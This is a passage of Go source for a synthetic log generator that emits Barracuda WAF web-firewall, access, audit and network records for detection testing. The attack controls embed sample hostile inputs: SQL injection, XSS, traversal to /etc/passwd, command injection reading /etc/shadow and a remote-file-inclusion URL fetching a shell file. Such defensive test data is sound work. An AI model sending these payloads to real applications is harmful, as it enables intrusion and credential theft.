package catalog

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/theshahrukh98khan/LogGen/internal/core"
)

// Barracuda Web Application Firewall controls.
//
// The Barracuda WAF does not emit one format. It emits five, one per log type,
// and they are positional space-separated records with different field orders.
// Sending a Web Firewall record through an Access Log decoder produces garbage
// that still parses, which is the thing to get right here. The log type is the
// third field in every record (%lt) and is the discriminator a decoder must
// branch on: WF, TR, AUDIT, NF, SYS.
//
// Source: Barracuda Web Application Firewall, "Exporting Log Formats"
// (firmware 7.6 documentation space, which is the version that still publishes
// the full token tables and worked examples):
//
//	https://documentation.campus.barracuda.com/wiki/display/BWAFv76/Exporting+Log+Formats
//	https://documentation.campus.barracuda.com/wiki/spaces/BWAFv76/pages/2721406/Logs
//
// Attack names, attack IDs, documented severity and attack category come from:
//
//	https://documentation.campus.barracuda.com/wiki/spaces/BWAFv76/pages/2721598/Attacks+Description+-+Action+Policy
//
// ---------------------------------------------------------------------------
// CONFIRMED against the vendor pages above
// ---------------------------------------------------------------------------
//
// The five default format strings, quoted verbatim:
//
//	System Log       %t %un %lt %md %ll %ei %ms
//	Web Firewall     %t %un %lt %sl %ad %ci %cp %ai %ap %ri %rt %at %fa %adl
//	                 %m %u %p %sid %ua %px %pp %au %r
//	Access Log       %t %un %lt %ai %ap %ci %cp %id %cu %m %p %h %v %s %bs %br
//	                 %ch %tt %si %sp %st %sid %rtf %pmf %pf %wmf %u %q %r %c
//	                 %ua %px %pp %au %cs1 %cs2 %cs3
//	Audit Log        %t %un %lt %an %ct %li %lp %trt %tri %cn %cht %ot %on
//	                 %var %ov %nv %add
//	Network Firewall %t %un %lt %sl %p %si %sp %di %dp %act %an %dsc
//
// The vendor's own worked examples, which the builders below are written
// against field by field:
//
//	WF    2014-04-11 10:50:30.411 +0530 wafbox1 WF ALER PRE_1_0_REQUEST
//	      99.99.1.117 34006 99.99.109.2 80 global GLOBAL LOG NONE
//	      [POST /index.cgi] POST 99.99.109.2/index.cgi HTTP REQ-0+RES-0
//	      "Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0"
//	      99.99.1.117 34005 Kevin http://99.99.109.2/index.cgi
//
//	TR    2014-04-11 12:04:04.735 +0530 wafbox1 TR 99.99.109.2 80 99.99.1.117
//	      34065 "-" "-" GET HTTP 99.99.106.25 HTTP/1.1 200 2829 232 0 1127
//	      10.11.25.117 80 21 REQ-0+RES-0 SERVER DEFAULT PASSIVE VALID
//	      /index.html name=srawat http://99.99.109.2/index.cgi namdksih=askdj
//	      "Mozilla/5.0 (...)" 99.99.1.117 34065 John gzip,deflate
//	      99.99.1.128 keep-alive
//
//	AUDIT 2014-02-24 09:05:17.764 -0800 wafbox1 AUDIT Adam GUI 10.11.18.121
//	      24784 CONFIG 166 config SET virtual_ip_config_address 99.99.130.45
//	      virtual_ip_config_interface "" "WAN" []
//
//	NF    2014-05-20 00:56:42.195 -0700 WAF1 NF INFO TCP 99.99.1.117 52676
//	      99.99.79.2 80 ALLOW testacl MGMT/LAN/WAN interface traffic:allow
//
// Also confirmed:
//
//   - Timestamp shape: "yyyy-mm-dd hh:mm:ss.s TZD" where TZD is +hh:mm or
//     -hh:mm. Note it contains a space, so a decoder cannot naively split the
//     whole record on whitespace and index from zero.
//   - %lt values: WF, TR, AUDIT, NF, SYS.
//   - Web Firewall %at (Action) values: DENY, LOG, WARNING. LOG means the
//     request was matched and recorded but served anyway. A SOC cares more
//     about LOG than DENY, so the controls below deliberately spread across
//     all three rather than always blocking.
//   - Web Firewall %rt (Rule Type) values: Global, Global URL ACL, URL ACL,
//     URL Policy, URL Profile, Parameter Profile, Header Profile.
//   - Web Firewall %fa (Follow-up Action): None, or Locked when a lockout is
//     configured.
//   - Access Log enumerations: %rtf INTERNAL|SERVER, %pmf DEFAULT|PROFILED,
//     %pf PASSIVE|PROTECTED|UNPROTECTED, %wmf VALID|INVALID, %ch 0 (served
//     from the backend) or 1 (served from cache).
//   - Access Log %id (Login) and %cu (Certificate User) are emitted as the
//     quoted string "-" when there is no authenticated user. The vendor
//     example shows exactly that.
//   - Audit %trt (Transaction Type) values: LOGIN, LOGOUT, CONFIG, COMMAND,
//     ROLLBACK, RESTORE, REBOOT, SHUTDOWN, FIRMWARE UPDATE, ENERGIZE UPDATE,
//     SUPPORT TUNNEL OPEN, SUPPORT TUNNEL CLOSED, FIRMWARE APPLY, FIRMWARE
//     REVERT, TRANSPARENT MODE, UNSUCCESSFUL LOGIN, ADMIN ACCESS VIOLATION.
//   - Audit %cht (Change Type) values: NONE, ADD, DELETE, SET.
//   - Audit %tri is -1 for events that change nothing, which is how LOGIN and
//     UNSUCCESSFUL LOGIN appear.
//   - Audit logs are streamed to the syslog server with priority INFO. That is
//     stated in the vendor page, so the audit controls below are pinned to
//     informational regardless of how serious the change is.
//   - Attack names in %ad are the "Attack Name in Export Logs" column of the
//     Attacks Description page: SQL_INJECTION_IN_PARAM, OS_CMD_INJECTION_IN_URL,
//     BRUTE_FORCE_FROM_IP, RATE_CONTROL_INTRUSION and so on. Every name used
//     below is taken from that table, not constructed.
//
// ---------------------------------------------------------------------------
// NOT CONFIRMED - inferred, and worth checking against a real unit
// ---------------------------------------------------------------------------
//
//   - Severity abbreviation. The vendor documents the full words (EMERGENCY,
//     ALERT, CRITICAL, ERROR, WARNING, NOTICE, INFORMATION, DEBUG) but the
//     worked examples emit four-character forms: ALER in the WF and SYS
//     examples, INFO in the NF example. ALER and INFO are therefore confirmed;
//     CRIT, WARN, ERRO, NOTI, EMER and DEBU below are extrapolated from the
//     same truncation rule and have not been seen in a sample.
//   - Attack Details (%adl). The only sample value is "[POST /index.cgi]", so
//     the square brackets are confirmed and nothing else is. The richer detail
//     strings used here, naming the offending parameter and the matched
//     internal pattern group, follow how the GUI presents the same data but
//     the exact wording inside the brackets is invented.
//   - Syslog facility. Facility is operator-configurable per log type under
//     ADVANCED > Export Logs; local0 is used here as a common choice, not as a
//     documented default.
//   - Syslog priority for WF, TR, NF and SYS records. Only the audit log's
//     INFO priority is documented. The others are mapped from the record's own
//     severity field, which is the sensible behaviour but is an assumption.
//   - Network Firewall %dsc. In the vendor example the tail reads
//     "MGMT/LAN/WAN interface traffic:allow", and the field table describes
//     "Details" and "the incoming network interface" as if they were two
//     things while the format string has only one token left. The builder here
//     emits a single %dsc carrying interface and detail together, matching the
//     sample byte for byte, but the split may really be two fields.
//   - System Log module names (%md) and event IDs (%ei). Only one pair is
//     published: module ADMIN_M, level ALER, event ID 51001, for the account
//     lockout message. The other module names and event IDs below are
//     plausible but unverified, so a rule should key on the message text
//     rather than the numeric ID.
//   - Access Log custom headers %cs1..%cs3. These carry whatever headers the
//     operator configured. The sample uses Accept-Encoding, Host and
//     Connection, which is what is reproduced here; a real unit will differ.

// ---------------------------------------------------------------------------
// Shared construction
// ---------------------------------------------------------------------------

// Log type discriminators (%lt).
const (
	bwLogWF    = "WF"
	bwLogTR    = "TR"
	bwLogAudit = "AUDIT"
	bwLogNF    = "NF"
	bwLogSys   = "SYS"
)

// Severity tokens as the worked examples render them. ALER and INFO are taken
// from vendor samples; the rest follow the same four-character truncation.
const (
	bwSevAlert = "ALER"
	bwSevCrit  = "CRIT"
	bwSevWarn  = "WARN"
	bwSevNoti  = "NOTI"
	bwSevInfo  = "INFO"
)

// bwTime renders "yyyy-mm-dd hh:mm:ss.sss +hhmm". Barracuda prints the zone
// with a colon in some firmware and without in others; the published samples
// show "+0530" and "-0800", so that is what is used.
func bwTime(c *core.Ctx) string {
	return c.Now.Format("2006-01-02 15:04:05.000 -0700")
}

// bwPayload wraps a Barracuda record. There is no syslog tag: the appliance
// sends the record as the whole message, and a tag would insert a program name
// in front of the timestamp that no Barracuda decoder expects.
func bwPayload(c *core.Ctx, severity int, msg string) core.Payload {
	return core.Payload{
		Kind:     core.SourceBarracudaWAF,
		Host:     c.Env.WAFHost,
		Facility: core.FacLocal0,
		Severity: severity,
		Message:  msg,
	}
}

// bwDash returns the placeholder Barracuda writes for an empty positional
// field so the field count stays constant.
func bwDash(s string) string {
	if strings.TrimSpace(s) == "" {
		return "-"
	}
	return s
}

// bwQuote wraps a value the way the samples quote the User-Agent and the audit
// old/new values.
func bwQuote(s string) string { return `"` + s + `"` }

// bwServiceIP is the virtual service address the WAF publishes, derived from
// the shared estate so it lines up with the other network sources.
func bwServiceIP(c *core.Ctx) string { return c.Env.Subnet + ".80" }

// bwSite is the published website name, taken from the shared estate so an
// Nginx or Apache record for the same request names the same host.
func bwSite(c *core.Ctx) string { return c.Env.WebHost + "." + c.Env.Domain }

// bwSessionID matches the sample's "REQ-n+RES-n" shape. Both halves come from
// one draw: generating them separately is how this file would end up with a
// request counter that does not match its response counter.
func bwSessionID(c *core.Ctx) string {
	n := c.Int(0, 9)
	return fmt.Sprintf("REQ-%d+RES-%d", n, n)
}

// ---------------------------------------------------------------------------
// Web Firewall log  (%lt = WF)
// ---------------------------------------------------------------------------

// bwWF holds the Web Firewall record in format order. The struct exists so the
// field order lives in exactly one place: this is positional data and a
// transposition here is silent.
type bwWFRec struct {
	severity  string // %sl
	attack    string // %ad   Attack Name in Export Logs
	clientIP  string // %ci
	clientPt  int    // %cp
	svcIP     string // %ai
	svcPort   int    // %ap
	rule      string // %ri   URL ACL path that matched
	ruleType  string // %rt   GLOBAL | URL ACL | URL POLICY | ...
	action    string // %at   DENY | LOG | WARNING
	followUp  string // %fa   NONE | LOCKED
	details   string // %adl  bracketed attack detail
	method    string // %m
	hostURL   string // %u    host concatenated with the path, no scheme
	proto     string // %p    HTTP | HTTPS
	sessionID string // %sid
	userAgent string // %ua   quoted
	proxyIP   string // %px
	proxyPort int    // %pp
	authUser  string // %au
	referer   string // %r
}

func (r bwWFRec) render(c *core.Ctx) string {
	return strings.Join([]string{
		bwTime(c),
		c.Env.WAFHost,
		bwLogWF,
		r.severity,
		r.attack,
		r.clientIP,
		strconv.Itoa(r.clientPt),
		r.svcIP,
		strconv.Itoa(r.svcPort),
		r.rule,
		r.ruleType,
		r.action,
		r.followUp,
		r.details,
		r.method,
		r.hostURL,
		r.proto,
		r.sessionID,
		bwQuote(r.userAgent),
		r.proxyIP,
		strconv.Itoa(r.proxyPort),
		bwDash(r.authUser),
		bwDash(r.referer),
	}, " ")
}

// bwWFBase fills the fields every Web Firewall record shares, so a control only
// has to state what makes it distinctive.
func bwWFBase(c *core.Ctx) bwWFRec {
	client := c.P("srcip", c.ExternalIP())
	port := c.EphemeralPort()
	return bwWFRec{
		severity:  bwSevAlert,
		clientIP:  client,
		clientPt:  port,
		svcIP:     bwServiceIP(c),
		svcPort:   443,
		rule:      "default",
		ruleType:  "GLOBAL",
		action:    "DENY",
		followUp:  "NONE",
		method:    "GET",
		proto:     "HTTPS",
		sessionID: bwSessionID(c),
		userAgent: c.P("useragent", c.UserAgent()),
		// The proxy fields preserve the pre-XFF source. With no proxy in play
		// the appliance repeats the client address and port, as the vendor
		// sample does.
		proxyIP:   client,
		proxyPort: port,
		referer:   "https://" + bwSite(c) + "/",
	}
}

// ---------------------------------------------------------------------------
// Access log  (%lt = TR)
// ---------------------------------------------------------------------------

type bwTRRec struct {
	svcIP     string // %ai
	svcPort   int    // %ap
	clientIP  string // %ci
	clientPt  int    // %cp
	login     string // %id   quoted, "-" when unauthenticated
	certUser  string // %cu   quoted, "-" when no client certificate
	method    string // %m
	proto     string // %p    HTTP | HTTPS
	host      string // %h
	version   string // %v    HTTP/1.1
	status    int    // %s
	bytesSent int    // %bs
	bytesRecv int    // %br
	cacheHit  int    // %ch   0 backend, 1 cache
	timeTaken int    // %tt   ms end to end
	serverIP  string // %si   backend
	serverPt  int    // %sp
	serverMs  int    // %st
	sessionID string // %sid
	respType  string // %rtf  INTERNAL | SERVER
	profile   string // %pmf  DEFAULT | PROFILED
	protected string // %pf   PASSIVE | PROTECTED | UNPROTECTED
	wfMatched string // %wmf  VALID | INVALID
	url       string // %u    path only
	query     string // %q
	referer   string // %r
	cookie    string // %c
	userAgent string // %ua   quoted
	proxyIP   string // %px
	proxyPort int    // %pp
	authUser  string // %au
	cs1       string // %cs1  Accept-Encoding in the vendor sample
	cs2       string // %cs2  Host
	cs3       string // %cs3  Connection
}

func (r bwTRRec) render(c *core.Ctx) string {
	return strings.Join([]string{
		bwTime(c),
		c.Env.WAFHost,
		bwLogTR,
		r.svcIP,
		strconv.Itoa(r.svcPort),
		r.clientIP,
		strconv.Itoa(r.clientPt),
		bwQuote(bwDash(r.login)),
		bwQuote(bwDash(r.certUser)),
		r.method,
		r.proto,
		r.host,
		r.version,
		strconv.Itoa(r.status),
		strconv.Itoa(r.bytesSent),
		strconv.Itoa(r.bytesRecv),
		strconv.Itoa(r.cacheHit),
		strconv.Itoa(r.timeTaken),
		r.serverIP,
		strconv.Itoa(r.serverPt),
		strconv.Itoa(r.serverMs),
		r.sessionID,
		r.respType,
		r.profile,
		r.protected,
		r.wfMatched,
		r.url,
		bwDash(r.query),
		bwDash(r.referer),
		bwDash(r.cookie),
		bwQuote(r.userAgent),
		r.proxyIP,
		strconv.Itoa(r.proxyPort),
		bwDash(r.authUser),
		r.cs1,
		r.cs2,
		r.cs3,
	}, " ")
}

func bwTRBase(c *core.Ctx) bwTRRec {
	client := c.P("srcip", c.ExternalIP())
	port := c.EphemeralPort()
	// Server time is part of the end-to-end time, so draw the backend figure
	// first and build the total from it rather than drawing two numbers that
	// can come out the wrong way round.
	serverMs := c.Int(3, 400)
	site := bwSite(c)
	return bwTRRec{
		svcIP:     bwServiceIP(c),
		svcPort:   443,
		clientIP:  client,
		clientPt:  port,
		method:    "GET",
		proto:     "HTTPS",
		host:      site,
		version:   "HTTP/1.1",
		status:    200,
		bytesSent: c.Int(400, 60000),
		bytesRecv: c.Int(120, 2000),
		cacheHit:  0,
		timeTaken: serverMs + c.Int(2, 60),
		serverIP:  c.InternalIP(),
		serverPt:  80,
		serverMs:  serverMs,
		sessionID: bwSessionID(c),
		respType:  "SERVER",
		profile:   "DEFAULT",
		protected: "PROTECTED",
		wfMatched: "VALID",
		url:       "/",
		referer:   "https://" + site + "/",
		cookie:    "JSESSIONID=" + c.HexLower(32),
		userAgent: c.P("useragent", c.UserAgent()),
		proxyIP:   client,
		proxyPort: port,
		cs1:       "gzip,deflate",
		cs2:       site,
		cs3:       "keep-alive",
	}
}

// ---------------------------------------------------------------------------
// Audit log  (%lt = AUDIT)
// ---------------------------------------------------------------------------

type bwAuditRec struct {
	admin     string // %an
	clientTyp string // %ct   GUI | API | CLI
	loginIP   string // %li
	loginPort int    // %lp
	txType    string // %trt
	txID      int    // %tri  -1 when nothing persistent changed
	command   string // %cn
	change    string // %cht  NONE | ADD | DELETE | SET
	objType   string // %ot
	objName   string // %on
	variable  string // %var
	oldValue  string // %ov   quoted
	newValue  string // %nv   quoted
	extra     string // %add  bracketed
}

func (r bwAuditRec) render(c *core.Ctx) string {
	return strings.Join([]string{
		bwTime(c),
		c.Env.WAFHost,
		bwLogAudit,
		r.admin,
		r.clientTyp,
		r.loginIP,
		strconv.Itoa(r.loginPort),
		r.txType,
		strconv.Itoa(r.txID),
		bwDash(r.command),
		r.change,
		bwDash(r.objType),
		bwDash(r.objName),
		bwDash(r.variable),
		bwQuote(r.oldValue),
		bwQuote(r.newValue),
		r.extra,
	}, " ")
}

func bwAuditBase(c *core.Ctx) bwAuditRec {
	return bwAuditRec{
		admin:     c.P("user", c.AdminUser()),
		clientTyp: "GUI",
		loginIP:   c.P("srcip", c.InternalIP()),
		loginPort: c.EphemeralPort(),
		txType:    "CONFIG",
		txID:      c.Int(100, 9999),
		command:   "config",
		change:    "SET",
		extra:     "[]",
	}
}

// ---------------------------------------------------------------------------
// System log  (%lt = SYS)  and Network Firewall log  (%lt = NF)
// ---------------------------------------------------------------------------

func bwSysRecord(c *core.Ctx, module, level string, eventID int, msg string) string {
	return strings.Join([]string{
		bwTime(c),
		c.Env.WAFHost,
		bwLogSys,
		module,
		level,
		strconv.Itoa(eventID),
		msg,
	}, " ")
}

func bwNFRecord(c *core.Ctx, level, proto, srcIP string, srcPort int,
	dstIP string, dstPort int, action, acl, details string) string {
	return strings.Join([]string{
		bwTime(c),
		c.Env.WAFHost,
		bwLogNF,
		level,
		proto,
		srcIP,
		strconv.Itoa(srcPort),
		dstIP,
		strconv.Itoa(dstPort),
		action,
		acl,
		details,
	}, " ")
}

// ---------------------------------------------------------------------------
// Shared parameters
// ---------------------------------------------------------------------------

var (
	bwpSrcIP = param("srcip", "Client IP", "auto")
	bwpUser  = param("user", "Admin account", "auto")
	bwpURL   = param("url", "Request path", "auto")
	bwpUA    = param("useragent", "User-Agent", "auto")
)

func init() {
	registerBarracudaWAFSignature()
	registerBarracudaWAFRate()
	registerBarracudaWAFPolicy()
	registerBarracudaWAFAccess()
	registerBarracudaWAFAudit()
	registerBarracudaWAFSystem()
	registerBarracudaWAFNetwork()
}

// ---------------------------------------------------------------------------
// Web Firewall: signature and category matches
// ---------------------------------------------------------------------------

// bwAttack is one signature-driven Web Firewall control. The action varies on
// purpose: a WAF that matched a SQL injection and still served the request
// (action LOG) is a far more urgent record than one that denied it, and a rule
// set that only looks for DENY will miss exactly the cases that matter.
type bwAttack struct {
	id       string   // control id suffix
	name     string   // control display name
	desc     string   // what a SOC should take from it
	attack   string   // %ad, from the Attack Name in Export Logs column
	rule     string   // %ri
	ruleType string   // %rt
	action   string   // %at
	followUp string   // %fa
	method   string   // %m
	path     string   // request path
	query    string   // query string appended to the path
	details  string   // %adl body, inside the brackets
	severity string   // %sl
	sev      string   // control severity label
	syslogSv int      // syslog priority
	mitre    []string // ATT&CK
}

func registerBarracudaWAFSignature() {
	attacks := []bwAttack{
		{
			id:     "sqli-param-blocked",
			name:   "SQL injection in parameter (blocked)",
			desc:   "A request parameter matched the SQL injection pattern group and the request was denied. Attack ID 157, category SQL Attacks.",
			attack: "SQL_INJECTION_IN_PARAM", rule: "webapp/login", ruleType: "PARAMETER PROFILE",
			action: "DENY", followUp: "NONE", method: "POST", path: "/login.jsp",
			query:    "username=admin'+OR+'1'='1&password=x",
			details:  "Parameter: username Pattern: sql-injection-medium",
			severity: bwSevAlert, sev: core.SevLabelHigh, syslogSv: core.SevAlert,
			mitre: []string{"T1190"},
		},
		{
			id:     "sqli-param-logged",
			name:   "SQL injection in parameter (detected, not blocked)",
			desc:   "The same parameter match, but the action policy was in passive mode so the request reached the application. This is the record to alert on hardest: the WAF saw the attack and let it through.",
			attack: "SQL_INJECTION_IN_PARAM", rule: "webapp/search", ruleType: "PARAMETER PROFILE",
			action: "LOG", followUp: "NONE", method: "GET", path: "/search",
			query:    "q=1'+UNION+SELECT+username,password+FROM+users--",
			details:  "Parameter: q Pattern: sql-injection-medium",
			severity: bwSevAlert, sev: core.SevLabelCritical, syslogSv: core.SevAlert,
			mitre: []string{"T1190", "T1211"},
		},
		{
			id:     "sqli-header-logged",
			name:   "SQL injection in header (detected, not blocked)",
			desc:   "A request header value matched a SQL injection pattern and was only logged. Header-borne injection bypasses parameter-only rules, so coverage gaps show up here first.",
			attack: "SQL_INJECTION_IN_HEADER", rule: "global", ruleType: "HEADER PROFILE",
			action: "LOG", followUp: "NONE", method: "GET", path: "/api/v1/orders",
			details:  "Header: X-Forwarded-For Pattern: sql-injection-medium",
			severity: bwSevAlert, sev: core.SevLabelHigh, syslogSv: core.SevAlert,
			mitre: []string{"T1190"},
		},
		{
			id:     "xss-param-blocked",
			name:   "Cross-site scripting in parameter (blocked)",
			desc:   "A parameter value matched the XSS pattern group and was denied. Attack ID 158, category XSS Injections.",
			attack: "CROSS_SITE_SCRIPTING_IN_PARAM", rule: "webapp/comment", ruleType: "PARAMETER PROFILE",
			action: "DENY", followUp: "NONE", method: "POST", path: "/comment/add",
			query:    "body=%3Cscript%3Edocument.location%3D%27//evil%27%3C/script%3E",
			details:  "Parameter: body Pattern: cross-site-scripting-medium",
			severity: bwSevAlert, sev: core.SevLabelMedium, syslogSv: core.SevAlert,
			mitre: []string{"T1059.007", "T1190"},
		},
		{
			id:     "xss-url-warned",
			name:   "Cross-site scripting in URL (warning only)",
			desc:   "An XSS pattern in the request path matched a rule set to warn. The request was served; only the record exists.",
			attack: "CROSS_SITE_SCRIPTING_IN_URL", rule: "global", ruleType: "GLOBAL URL ACL",
			action: "WARNING", followUp: "NONE", method: "GET", path: "/page/%3Cimg%20src=x%20onerror=alert(1)%3E",
			details:  "URL Pattern: cross-site-scripting-medium",
			severity: bwSevWarn, sev: core.SevLabelHigh, syslogSv: core.SevWarning,
			mitre: []string{"T1059.007"},
		},
		{
			id:     "traversal-param-blocked",
			name:   "Directory traversal in parameter (blocked)",
			desc:   "A parameter contained a path traversal sequence. Attack ID 160, category Injection Attacks.",
			attack: "DIRECTORY_TRAVERSAL_IN_PARAM", rule: "webapp/download", ruleType: "PARAMETER PROFILE",
			action: "DENY", followUp: "LOCKED", method: "GET", path: "/download",
			query:    "file=../../../../etc/passwd",
			details:  "Parameter: file Pattern: directory-traversal",
			severity: bwSevAlert, sev: core.SevLabelHigh, syslogSv: core.SevAlert,
			mitre: []string{"T1083", "T1190"},
		},
		{
			id:     "traversal-beyond-root-logged",
			name:   "Directory traversal beyond root (detected, not blocked)",
			desc:   "Attempted access above the document root, recorded but served. Attack ID 16, category Forceful Browsing.",
			attack: "DIRECTORY_TRAVERSAL_BEYOND_ROOT", rule: "global", ruleType: "GLOBAL",
			action: "LOG", followUp: "NONE", method: "GET", path: "/static/..%2f..%2f..%2fWEB-INF/web.xml",
			details:  "URL Normalization: path resolved above document root",
			severity: bwSevAlert, sev: core.SevLabelHigh, syslogSv: core.SevAlert,
			mitre: []string{"T1083"},
		},
		{
			id:     "cmdinjection-param-blocked",
			name:   "OS command injection in parameter (blocked)",
			desc:   "A parameter matched the OS command injection pattern group. Attack ID 159, category Injection Attacks. This one usually means hands on keyboard.",
			attack: "OS_CMD_INJECTION_IN_PARAM", rule: "webapp/tools", ruleType: "PARAMETER PROFILE",
			action: "DENY", followUp: "LOCKED", method: "POST", path: "/tools/ping",
			query:    "host=127.0.0.1;cat+/etc/shadow",
			details:  "Parameter: host Pattern: os-cmd-injection-medium",
			severity: bwSevAlert, sev: core.SevLabelCritical, syslogSv: core.SevAlert,
			mitre: []string{"T1059.004", "T1190"},
		},
		{
			id:     "cmdinjection-url-logged",
			name:   "OS command injection in URL (detected, not blocked)",
			desc:   "A command injection pattern in the request path was logged but passed through. Attack ID 168. Treat as a probable compromise until the backend says otherwise.",
			attack: "OS_CMD_INJECTION_IN_URL", rule: "global", ruleType: "GLOBAL",
			action: "LOG", followUp: "NONE", method: "GET", path: "/cgi-bin/status%3B%2Fbin%2Fbash%20-i",
			details:  "URL Pattern: os-cmd-injection-medium",
			severity: bwSevAlert, sev: core.SevLabelCritical, syslogSv: core.SevAlert,
			mitre: []string{"T1059.004"},
		},
		{
			id:     "remote-file-inclusion-blocked",
			name:   "Remote file inclusion (blocked)",
			desc:   "A parameter pointed at an off-site resource for inclusion. Attack ID 164, category Injection Attacks.",
			attack: "REMOTE_FILE_INCLUSION", rule: "webapp/index", ruleType: "PARAMETER PROFILE",
			action: "DENY", followUp: "NONE", method: "GET", path: "/index.php",
			query:    "page=http://198.51.100.77/shell.txt",
			details:  "Parameter: page Pattern: remote-file-inclusion",
			severity: bwSevAlert, sev: core.SevLabelHigh, syslogSv: core.SevAlert,
			mitre: []string{"T1505.003", "T1190"},
		},
		{
			id:     "identity-theft-response-logged",
			name:   "Identity theft pattern in response (detected, not blocked)",
			desc:   "Data theft protection matched a credit card or national ID pattern in the response body and did not mask it. Attack ID 63, category Outbound Attacks. This is data leaving.",
			attack: "IDENTITY_THEFT_PATTERN_MATCHED", rule: "webapp/report", ruleType: "URL POLICY",
			action: "LOG", followUp: "NONE", method: "GET", path: "/reports/customers.csv",
			details:  "Identity Theft Type: Credit Card Matches: 412",
			severity: bwSevAlert, sev: core.SevLabelCritical, syslogSv: core.SevErr,
			mitre: []string{"T1530", "T1213"},
		},
	}

	for _, a := range attacks {
		a := a
		Register(core.Definition{
			Control: core.Control{
				ID: "barracuda-waf-wf-" + a.id, Source: core.SourceBarracudaWAF,
				Group: "Web Firewall: Attacks", Name: a.name, Desc: a.desc,
				EventID: a.attack, Channel: "WF", Severity: a.sev,
				Mitre:  a.mitre,
				Params: []core.Param{bwpSrcIP, bwpURL, bwpUA},
			},
			Build: func(c *core.Ctx) core.Payload {
				r := bwWFBase(c)
				r.severity = a.severity
				r.attack = a.attack
				r.rule = a.rule
				r.ruleType = a.ruleType
				r.action = a.action
				r.followUp = a.followUp
				r.method = a.method
				r.details = "[" + a.details + "]"

				path := c.P("url", a.path)
				if a.query != "" {
					path += "?" + a.query
				}
				r.hostURL = bwSite(c) + path
				return bwPayload(c, a.syslogSv, r.render(c))
			},
		})
	}
}

// ---------------------------------------------------------------------------
// Web Firewall: rate control and brute force
// ---------------------------------------------------------------------------

func registerBarracudaWAFRate() {
	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-brute-force-ip", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Rate Control", Name: "Brute force from IP",
			Desc:    "A single client exceeded the configured request count against a protected URL space. Attack ID 145, category DDOS Attacks. On a login URL this is credential stuffing.",
			EventID: "BRUTE_FORCE_FROM_IP", Channel: "WF", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110.003", "T1110.004"},
			Params: []core.Param{bwpSrcIP, bwpURL, bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "BRUTE_FORCE_FROM_IP"
			r.rule = "webapp/login"
			r.ruleType = "URL POLICY"
			r.action = "DENY"
			// A brute force trip is the usual reason a lockout fires.
			r.followUp = "LOCKED"
			r.method = "POST"
			r.hostURL = bwSite(c) + c.P("url", "/login")
			// One draw, used in both the threshold and the observed count, so
			// the detail line cannot contradict itself.
			limit := c.Pick1(20, 50, 100)
			r.details = fmt.Sprintf("[Count exceeded for client: %d requests in 60 seconds, limit %d]",
				limit+c.Int(1, 40), limit)
			return bwPayload(c, core.SevAlert, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-brute-force-all", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Rate Control", Name: "Brute force from all sources",
			Desc:    "The aggregate request rate to a protected URL exceeded the limit across every client. Attack ID 146. This is the distributed form, which per-IP rules will not catch.",
			EventID: "BRUTE_FORCE_FROM_ALL_SOURCES", Channel: "WF", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110.003", "T1498"},
			Params: []core.Param{bwpSrcIP, bwpURL},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "BRUTE_FORCE_FROM_ALL_SOURCES"
			r.rule = "webapp/login"
			r.ruleType = "URL POLICY"
			r.action = "DENY"
			r.followUp = "NONE"
			r.method = "POST"
			r.hostURL = bwSite(c) + c.P("url", "/login")
			limit := c.Pick1(500, 1000, 2000)
			r.details = fmt.Sprintf("[Count exceeded from all sources: %d requests in 60 seconds, limit %d]",
				limit+c.Int(10, 900), limit)
			return bwPayload(c, core.SevAlert, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-brute-force-fingerprint", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Rate Control", Name: "Brute force from client fingerprint",
			Desc:    "The same client fingerprint exceeded the limit while rotating source addresses. Attack ID 346. Rotating proxies defeat per-IP counting and this is what catches them.",
			EventID: "BRUTE_FORCE_FROM_FINGERPRINT", Channel: "WF", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110.003", "T1090.003"},
			Params: []core.Param{bwpSrcIP, bwpURL},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "BRUTE_FORCE_FROM_FINGERPRINT"
			r.rule = "webapp/login"
			r.ruleType = "URL POLICY"
			r.action = "DENY"
			r.followUp = "LOCKED"
			r.method = "POST"
			r.hostURL = bwSite(c) + c.P("url", "/api/v1/auth/token")
			r.details = "[Client fingerprint " + c.HexLower(16) + " exceeded request limit]"
			return bwPayload(c, core.SevAlert, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-rate-control-intrusion", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Rate Control", Name: "Rate control intrusion (detected, not blocked)",
			Desc:    "The configured request rate for a URL space was exceeded and the policy only recorded it. Attack ID 75, category DDOS Attacks. Rate control in log-only mode is the usual reason a scraping run completes unimpeded.",
			EventID: "RATE_CONTROL_INTRUSION", Channel: "WF", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1498.001", "T1595.003"},
			Params: []core.Param{bwpSrcIP, bwpURL},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "RATE_CONTROL_INTRUSION"
			r.rule = "webapp/api"
			r.ruleType = "URL POLICY"
			r.action = "LOG"
			r.followUp = "NONE"
			r.hostURL = bwSite(c) + c.P("url", "/api/v1/customers")
			limit := c.Pick1(100, 250, 500)
			r.details = fmt.Sprintf("[Request rate %d/second exceeded configured limit %d/second]",
				limit+c.Int(5, 200), limit)
			return bwPayload(c, core.SevAlert, r.render(c))
		},
	})

}

// ---------------------------------------------------------------------------
// Web Firewall: policy, protocol and session violations
// ---------------------------------------------------------------------------

func registerBarracudaWAFPolicy() {
	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-geoip-blocked", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Policy", Name: "GeoIP policy matched",
